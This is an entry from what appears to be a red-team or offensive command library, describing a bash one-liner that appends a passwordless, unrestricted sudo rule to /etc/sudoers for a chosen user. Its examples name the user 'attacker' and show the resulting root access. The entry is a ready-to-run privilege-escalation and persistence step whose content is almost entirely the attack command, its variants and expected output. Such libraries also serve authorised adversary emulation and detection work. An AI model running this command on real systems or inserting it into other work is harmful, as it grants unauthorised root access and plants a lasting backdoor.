---
id: 8c601f18-733a-418e-bf4b-eef7777c8f71
name: allow-user-sudo-without-password
type: command
executor: bash
data: 'echo "$_USERNAME ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers'
output: null
created_at: '2023-04-06T03:56:19.286323+00:00'
updated_at: '2023-04-10T20:34:29.642335+00:00'
platforms:
  - Linux
tags:
  - privilege-escalation
  - sudoers
verified: true
validated: true
---

# allow-user-sudo-without-password

## Command

```bash
echo "$_USERNAME ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

## Description

Appends a sudoers entry allowing the specified user to run all sudo commands without a password prompt, enabling seamless privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | The target username to enable passwordless sudo for | Yes |

## Examples

### Basic Usage

```bash
echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

### Advanced Usage

With verification:

```bash
echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers && sudo -l -U attacker
```

## Expected Output

Silent on success. Verify the addition:

```
$ tail /etc/sudoers
... (other lines)
attacker ALL=(ALL) NOPASSWD: ALL
```

Post-execution, 'sudo whoami' as the user should return 'root' without prompting.

## Related

- [[procedures/Linux-Privilege-Escalation-via-Writable-etc-sudoers]]
